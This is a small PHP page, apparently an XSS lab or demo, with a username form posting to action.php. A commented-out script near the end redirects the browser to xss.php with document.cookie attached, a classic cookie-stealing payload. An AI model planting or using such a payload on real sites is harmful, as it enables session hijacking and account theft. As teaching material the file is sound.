<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta content="width=device-width, initial-scale=1.0" name="viewport">
	<meta name="google" content="notranslate">
	<title>xss</title>
	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
	<center class="mt-5" ><h1>XSS</h1></center>
	<section class="container mt-5 justify-content-center align-items-center d-flex">
	    <form class="w-50 " action="action.php" method="post">
	        <div class="form-group">
	            <label for="name">Name</label>
	            <input type="text" class="form-control" placeholder="Enter username" id="name" name="name">
	        </div>
	        <button type="submit" class="btn btn-primary">Submit</button>
	    </form>
	</section>
	
	<script>
	if (window.history.replaceState) {
	    window.history.replaceState(null, null, window.location.href);
	}
	</script>
	<!-- <script> location.href="xss.php?data="+document.cookie</script> -->
</body>
</html>